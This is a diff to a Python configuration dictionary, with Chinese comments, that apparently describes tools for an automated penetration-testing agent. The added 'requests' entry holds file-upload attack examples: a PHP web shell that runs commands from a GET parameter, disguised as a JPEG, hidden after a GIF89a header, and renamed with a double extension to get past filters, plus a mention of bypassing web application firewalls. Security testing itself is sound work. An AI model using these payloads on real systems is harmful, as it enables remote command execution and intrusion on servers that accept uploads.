@@ -7,32 +7,38 @@
 TOOL_SCENARIOS = {
     # ==================== 核心手工测试工具 ====================
     "requests": {
-        "function": "发送自定义HTTP请求进行手工安全测试",
+        "function": "发送HTTP请求，支持GET/POST/文件上传",
         "best_for": [
-            "需要精确控制请求头、Cookie、请求体的场景",
-            "验证其他工具发现的漏洞（手工确认）",
-            "需要自定义认证逻辑或特殊编码的场景",
-            "绕过简单WAF/过滤的变形测试",
-            "调试和分析HTTP响应、处理复杂重定向",
-            "文件上传漏洞测试（POST multipart/form-data）"
+            "文件上传攻击（使用files参数）",
+            "手工验证漏洞、精确控制请求",
+            "绕过WAF/过滤的变形测试"
         ],
         "not_for": [
-            "大规模扫描任务（效率低）",
-            "需要自动处理反爬虫/CAPTCHA的场景",
-            "需要浏览器环境执行JavaScript的场景"
+            "大规模扫描任务",
+            "需要浏览器环境的场景"
         ],
-        "prerequisite": "了解HTTP协议基础，能构造合理的请求参数",
-        "cost": "低",
-        "example": "文件上传攻击: requests.post(url, files={'file': ('shell.php', '<?php system($_GET[cmd]); ?>', 'image/jpeg')})",
-        "file_upload_example": {
-            "description": "文件上传POST请求格式",
-            "params": {
-                "method": "POST",
-                "url": "http://target/upload.php",
-                "files": {"file": ["shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"]},
-                "headers": {"Content-Type": "multipart/form-data"}
+        "params_format": {
+            "method": "GET/POST",
+            "url": "目标URL",
+            "headers": {"Header-Name": "value"},
+            "data": "POST请求体",
+            "files": {"字段名": ["文件名", "文件内容", "MIME类型"]}
+        },
+        "file_upload_examples": [
+            {
+                "desc": "上传PHP木马（伪装图片）",
+                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["shell.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"]}}
+            },
+            {
+                "desc": "上传图片马（真实GIF头）",
+                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["test.gif", "GIF89a<?php system($_GET['c']); ?>", "image/gif"]}}
+            },
+            {
+                "desc": "双扩展名绕过",
+                "params": {"method": "POST", "url": "http://target/upload.php", "files": {"file": ["shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"]}}
             }
-        }
+        ],
+        "cost": "低"
     },
 
     "python-exec": {
